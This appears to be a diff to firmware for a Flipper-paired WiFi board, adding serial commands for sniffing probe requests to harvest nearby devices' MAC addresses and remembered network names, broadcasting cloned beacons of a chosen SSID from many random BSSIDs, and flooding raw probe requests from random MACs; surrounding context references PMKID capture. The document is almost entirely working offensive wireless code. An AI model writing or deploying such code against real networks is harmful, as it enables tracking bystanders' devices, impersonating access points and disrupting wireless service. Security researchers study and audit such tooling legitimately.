@@ -662,6 +662,97 @@ static void sta_stream(int ch) {
   Serial.println(fin); Serial1.println(fin);
 }
 
+// --- A1: probe-request sniffer / PNL extraction --------------------------------
+// Devices broadcast probe requests naming the SSIDs they remember (their Preferred
+// Network List). We log each sender's MAC + the requested SSID(s) so the Flipper can build
+// a "known networks" inventory (recon / audit). Directed probes carry the SSID; wildcard
+// probes reveal only the client. RSSI is not delivered to the promisc callback.
+#define PROBE_MAX 12
+typedef struct { uint8_t mac[6]; uint8_t n; char ssid[2][33]; } probe_t;
+static probe_t probes[PROBE_MAX];
+static uint8_t probe_n = 0;
+
+static void probe_add(const uint8_t* mac, const char* ssid) {
+  int idx = -1;
+  for(uint8_t i = 0; i < probe_n; i++)
+    if(!memcmp(probes[i].mac, mac, 6)) { idx = i; break; }
+  if(idx < 0) {
+    if(probe_n >= PROBE_MAX) return;
+    idx = probe_n++;
+    memcpy(probes[idx].mac, mac, 6);
+    probes[idx].n = 0;
+  }
+  if(ssid && ssid[0]) {
+    for(uint8_t k = 0; k < probes[idx].n; k++)
+      if(!strcmp(probes[idx].ssid[k], ssid)) return;
+    if(probes[idx].n < 2) {
+      strncpy(probes[idx].ssid[probes[idx].n], ssid, 32);
+      probes[idx].ssid[probes[idx].n][32] = 0;
+      probes[idx].n++;
+    }
+  }
+}
+
+static void promisc_probe_cb(unsigned char* buf, unsigned int len, void* ud) {
+  (void)ud;
+  if(len < 24) return;
+  uint8_t ftype = (buf[0] >> 2) & 3;
+  uint8_t stype = (buf[0] >> 4) & 0xF;
+  if(ftype != 0 || stype != 4) return;          // mgmt, probe request only
+  const uint8_t* src = buf + 10;                // addr2
+  if(src[0] & 0x01) return;                     // multicast/broadcast sender — skip
+  char ssid[33]; ssid[0] = 0;
+  unsigned int p = 24;
+  while(p + 2 <= len) {
+    uint8_t id = buf[p], il = buf[p + 1];
+    if(p + 2 + il > len) break;
+    if(id == 0) {                               // SSID IE
+      int n = il > 32 ? 32 : il;
+      memcpy(ssid, buf + p + 2, n);
+      ssid[n] = 0;
+      break;
+    }
+    p += 2 + il;
+  }
+  probe_add(src, ssid);
+}
+
+static void probe_stream(int ch) {
+  for(uint8_t i = 0; i < probe_n; i++) {
+    char line[160];
+    int n = snprintf(line, sizeof(line), "PROBE:%02X:%02X:%02X:%02X:%02X:%02X|",
+      probes[i].mac[0], probes[i].mac[1], probes[i].mac[2],
+      probes[i].mac[3], probes[i].mac[4], probes[i].mac[5]);
+    if(probes[i].n == 0) {
+      n += snprintf(line + n, sizeof(line) - n, "*");
+    } else {
+      for(uint8_t k = 0; k < probes[i].n; k++)
+        n += snprintf(line + n, sizeof(line) - n, "%s%s", k ? "," : "", probes[i].ssid[k]);
+    }
+    Serial.println(line); Serial1.println(line);
+  }
+  String fin = "PROBEDONE: ch=" + String(ch) + " n=" + String((unsigned)probe_n);
+  Serial.println(fin); Serial1.println(fin);
+}
+
+// --- B7: probe-request flood (raw probe request frames) -------------------------
+static void tx_probe_req(const uint8_t* src, const char* ssid) {
+  uint8_t f[128]; int n = 0;
+  f[n++] = 0x40; f[n++] = 0x00;                 // frame control: probe request
+  f[n++] = 0x00; f[n++] = 0x00;                 // duration
+  for(int i = 0; i < 6; i++) f[n++] = 0xFF;     // addr1 broadcast
+  for(int i = 0; i < 6; i++) f[n++] = src[i];   // addr2 src
+  for(int i = 0; i < 6; i++) f[n++] = 0xFF;     // addr3 bssid
+  f[n++] = 0x00; f[n++] = 0x00;                 // seq
+  int sl = ssid ? (int)strlen(ssid) : 0;
+  if(sl > 32) sl = 32;
+  f[n++] = 0x00; f[n++] = (uint8_t)sl;          // SSID element
+  for(int i = 0; i < sl; i++) f[n++] = (uint8_t)ssid[i];
+  f[n++] = 0x01; f[n++] = 0x04;                 // supported rates IE
+  f[n++] = 0x82; f[n++] = 0x84; f[n++] = 0x8b; f[n++] = 0x96;
+  wifi_tx_raw_frame(f, n);
+}
+
 // --- P6: PMKID extraction from EAPOL-Key M1 ----------------------------------
 // Clientless PMKID: many WPA2 APs put the PMKID in the RSN key-data KDE of the very
 // first EAPOL-Key (M1). We identify M1 (key info ACK set, MIC clear, RSN descriptor)
@@ -1448,6 +1539,62 @@ void loop() {
         hopping = true;
       }
       String r = String("HOP:") + (hopping ? "on " : "off ") + String(hopping ? (unsigned)hop_interval_ms : 0u);
+      Serial.println(r); Serial1.println(r);
+    }else if(readString.substring(0,10)=="PROBESNIFF"){
+      // A1: harvest probe requests on <chan> for [secs] -> the PNL of nearby devices.
+      int s1 = readString.indexOf(' ');
+      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
+      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
+      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
+      if(ch < 1 || ch > 165) ch = 6;
+      if(secs < 1 || secs > 60) secs = 10;
+      if(apActive) destroyAP();   // monitor capture needs the softAP torn down
+      probe_n = 0;
+      wext_set_channel(WLAN0_NAME, ch);
+      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_probe_cb, 0);
+      for(int i=0;i<secs;i++) delay(1000);
+      wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
+      probe_stream(ch);
+    }else if(readString.substring(0,7)=="APCLONE"){
+      // B6: clone <ssid> across [cnt] random locally-administered BSSIDs (AP clone spam).
+      int s1 = readString.indexOf(' ');
+      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
+      String ssid = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
+      int cnt = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 8;
+      if(cnt < 1 || cnt > 40) cnt = 8;
+      if(ssid.length() == 0){
+        Serial.println("ERROR: APCLONE needs <ssid> [count]"); Serial1.println("ERROR: APCLONE needs <ssid> [count]");
+      }else{
+        if(apActive) destroyAP();
+        for(int i=0;i<cnt;i++){
+          uint8_t src[6];
+          for(int k=0;k<6;k++) src[k] = (uint8_t)random(0x00, 0xFF);
+          src[0] = (src[0] & 0xFC) | 0x02;      // locally administered, unicast
+          for(int x=0;x<3;x++) wifi_tx_beacon_frame(src, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid.c_str());
+        }
+        String r = "APCLONE:" + String((unsigned)cnt) + "|" + ssid;
+        Serial.println(r); Serial1.println(r);
+      }
+    }else if(readString.substring(0,10)=="PROBEFLOOD"){
+      // B7: emit probe requests for <ssid|*> on <chan> from [cnt] random MACs.
+      int s1 = readString.indexOf(' ');
+      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
+      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
+      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
+      String ssid = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("*");
+      int cnt = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 24;
+      if(ch < 1 || ch > 165) ch = 6;
+      if(cnt < 1 || cnt > 200) cnt = 24;
+      const char* s = (ssid == "*") ? NULL : ssid.c_str();
+      if(apActive) destroyAP();
+      wext_set_channel(WLAN0_NAME, ch);
+      for(int i=0;i<cnt;i++){
+        uint8_t src[6];
+        for(int k=0;k<6;k++) src[k] = (uint8_t)random(0x00, 0xFF);
+        src[0] = (src[0] & 0xFC) | 0x02;
+        tx_probe_req(src, s);
+      }
+      String r = "PROBEFLOOD:" + String((unsigned)cnt);
       Serial.println(r); Serial1.println(r);
     }else if(readString.substring(0,7)=="PMFSCAN"){
       // P2: classify nearby APs (PMF-required / SAE / #AKMs) from the beacon RSN IE.
